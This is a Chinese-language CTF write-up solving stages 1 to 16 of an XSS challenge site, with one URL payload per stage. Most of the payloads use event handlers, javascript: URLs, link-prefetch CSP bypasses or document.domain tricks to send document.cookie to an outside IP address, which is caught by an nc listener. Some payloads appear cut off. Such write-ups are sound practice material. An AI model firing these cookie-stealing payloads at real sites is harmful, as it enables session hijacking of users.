# 前言
做了一个xss平台的题目，一共34题，题目还不错，这里记录一下解题记录  
题目地址：[传送门](https://knock.xss.moe/index)
# 题目
这个平台接收flag的形式和其它平台不同，得用vps或者是用xss平台去接收cookie（flag在cookie中）
## stage1
第一关它是告诉你你怎么去获取flag的  
直接把你的payload在这里提交（记住一定是要在这个填入你的payload），然后用你的vps去接受flag就行了  
payload
    http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=`http://134.175.33.164:1234/?${document.cookie}`
然后服务器端用nc监听接收flag
    nc -lvvkp 1234
可以看到成功接收到了flag  
## stage2
第二关直接可以嵌入js代码  
payload
    http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=
## stage3
第三关q参数可控，直接闭合a标签  
payload
    http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=">
## stage4
和第三关同理，只不过把双引号变成了单引号
payload
    http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='>
## stage5
直接闭合textarea标签  
payload
    http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=
## stage6
直接闭合xmp  
payload
    http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=
## stage7
第七关尖括号被转义了  
我们可以用onfocus事件，并且用它的autofocus属性去触发onfocus事件  
payload
    http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS" autofocus onfocus="document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage8
和第七关同理，只不过把双引号变成了单引号  
payload
    http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=xss' autofocus onfocus='document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage9
和第七关同理，但是没有引号
payload
    http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS autofocus onfocus=document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage10
这题双引号被转义了，无法闭合双引号。所以我们可以考虑用javascript伪协议  
    http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage11
和stage10同理
payload
    http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage12
12关发现有CSP，只能默认同源下的资源加载，iframe标签也只能加载同源资源，但是有inline存在，所以我们可以用预加载Bypass掉CSP  
尝试构造
    var xss = document.createElement(`link`);
    xss.setAttribute(`rel`, `prefetch`);
    xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);
    document.head.appendChild(xss);
最终payload
    http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=javascript:var xss = document.createElement(`link`);xss.setAttribute(`rel`, `prefetch`);xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);document.head.appendChild(xss);
    //页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载
## stage13
十三关发现过滤了很多字符如window，document,cookie，img等字符，不过fuzz了一下发现svg可以用，其它的我们可以用base64编码绕过
## stage14
14关又发现CSP
但是和12关相比，它没有了unline，所以预加载的方法行不通了，但是我们可以看到这里
    frame-src http://*.knock.xss.moe
它允许knock.xss.moe的所有子域的资源可以被frame访问，那么问题来了，我们怎么样才可以用到knock.xss.moe子域的资源呢，灵机一动：既然是所有的子域，我们可利用其它关卡嘛
尝试构造
    http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=alert(1);
发现可以执行
然后我们再通过document.domain指定域，跨域获得flag(cookie)  
最终payload：
    http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://134.175.33.164:1234/?${parent.document.cookie}`)
## stage15
直接用svg就OK了  
payload
    http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Csvg/onload=document.location=`http://134.175.33.164:1234/?${document.cookie}`%3E
## stage16
16关是跳转到q参数所对应的网址  